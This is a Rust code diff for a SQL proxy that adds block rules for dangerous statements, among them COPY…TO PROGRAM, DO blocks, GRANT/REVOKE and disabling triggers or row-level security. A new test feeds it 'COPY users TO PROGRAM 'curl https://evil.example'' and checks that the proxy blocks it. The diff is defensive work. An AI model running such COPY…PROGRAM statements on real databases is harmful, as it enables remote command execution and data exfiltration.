@@ -116,15 +116,23 @@ pub fn default_ruleset() -> Vec<Rule> {
         ("VETRO-030", Severity::Critical, EnforcementAction::Block), // UPDATE without WHERE (primary tables)
         ("VETRO-042", Severity::Critical, EnforcementAction::Block), // UPDATE without WHERE
         ("VETRO-090", Severity::Critical, EnforcementAction::Block), // OR tautology in WHERE (SQL injection)
+        ("VETRO-080", Severity::Critical, EnforcementAction::Block), // COPY … TO/FROM PROGRAM (server-side RCE)
+        ("VETRO-081", Severity::Critical, EnforcementAction::Block), // DO $$ … $$ anonymous code block
         // High / BLOCK.
         ("VETRO-002", Severity::High, EnforcementAction::Block), // DELETE with LIMIT 0 (MySQL)
         ("VETRO-013", Severity::High, EnforcementAction::Block), // DROP INDEX without IF EXISTS
         ("VETRO-015", Severity::High, EnforcementAction::Block), // ALTER TABLE DROP COLUMN
         ("VETRO-016", Severity::High, EnforcementAction::Block), // ALTER TABLE RENAME
+        ("VETRO-017", Severity::High, EnforcementAction::Block), // ALTER TABLE DROP CONSTRAINT
+        ("VETRO-018", Severity::High, EnforcementAction::Block), // ALTER TABLE ALTER COLUMN TYPE
+        ("VETRO-019", Severity::High, EnforcementAction::Block), // ALTER TABLE DISABLE TRIGGER / RLS
         ("VETRO-031", Severity::High, EnforcementAction::Block), // UPDATE in CTE without WHERE
         ("VETRO-033", Severity::High, EnforcementAction::Block), // DELETE in subquery without WHERE
         ("VETRO-040", Severity::High, EnforcementAction::Block), // INSERT INTO … SELECT without filter
         ("VETRO-070", Severity::High, EnforcementAction::Block), // SLEEP() / PG_SLEEP()
+        ("VETRO-082", Severity::High, EnforcementAction::Block), // GRANT / REVOKE
+        ("VETRO-083", Severity::High, EnforcementAction::Block), // MERGE (mass mutation)
+        ("VETRO-084", Severity::High, EnforcementAction::Block), // CREATE TABLE AS SELECT (bulk copy)
         // Medium / FLAG.
         ("VETRO-050", Severity::Medium, EnforcementAction::Flag), // SELECT without LIMIT
         ("VETRO-051", Severity::Medium, EnforcementAction::Flag), // SELECT * without WHERE
@@ -161,14 +169,22 @@ mod tests {
         ("VETRO-030", Severity::Critical, EnforcementAction::Block),
         ("VETRO-042", Severity::Critical, EnforcementAction::Block),
         ("VETRO-090", Severity::Critical, EnforcementAction::Block),
+        ("VETRO-080", Severity::Critical, EnforcementAction::Block),
+        ("VETRO-081", Severity::Critical, EnforcementAction::Block),
         ("VETRO-002", Severity::High, EnforcementAction::Block),
         ("VETRO-013", Severity::High, EnforcementAction::Block),
         ("VETRO-015", Severity::High, EnforcementAction::Block),
         ("VETRO-016", Severity::High, EnforcementAction::Block),
+        ("VETRO-017", Severity::High, EnforcementAction::Block),
+        ("VETRO-018", Severity::High, EnforcementAction::Block),
+        ("VETRO-019", Severity::High, EnforcementAction::Block),
         ("VETRO-031", Severity::High, EnforcementAction::Block),
         ("VETRO-033", Severity::High, EnforcementAction::Block),
         ("VETRO-040", Severity::High, EnforcementAction::Block),
         ("VETRO-070", Severity::High, EnforcementAction::Block),
+        ("VETRO-082", Severity::High, EnforcementAction::Block),
+        ("VETRO-083", Severity::High, EnforcementAction::Block),
+        ("VETRO-084", Severity::High, EnforcementAction::Block),
         ("VETRO-050", Severity::Medium, EnforcementAction::Flag),
         ("VETRO-051", Severity::Medium, EnforcementAction::Flag),
         ("VETRO-061", Severity::Medium, EnforcementAction::Flag),
@@ -224,6 +240,32 @@ mod tests {
                 assert_eq!(severity, Severity::Critical);
             }
             TcpDecision::Forward { .. } => panic!("destructive query must Block, not Forward"),
+        }
+    }
+
+    // A COPY … TO PROGRAM (VETRO-080, Critical/Block) must Block via the
+    // built-in default_ruleset — proves the new dangerous-statement codes are
+    // wired into the proxy's fallback catalogue.
+    #[test]
+    fn copy_program_blocks_via_default_ruleset() {
+        let rules = default_ruleset();
+        let policy = EnforcementPolicy::default();
+        let decision = evaluate(
+            "COPY users TO PROGRAM 'curl https://evil.example'",
+            Dialect::Postgres,
+            &rules,
+            &policy,
+        );
+        match decision {
+            TcpDecision::Block {
+                rule_code,
+                severity,
+                ..
+            } => {
+                assert_eq!(rule_code, "VETRO-080");
+                assert_eq!(severity, Severity::Critical);
+            }
+            TcpDecision::Forward { .. } => panic!("COPY … PROGRAM must Block"),
         }
     }
 
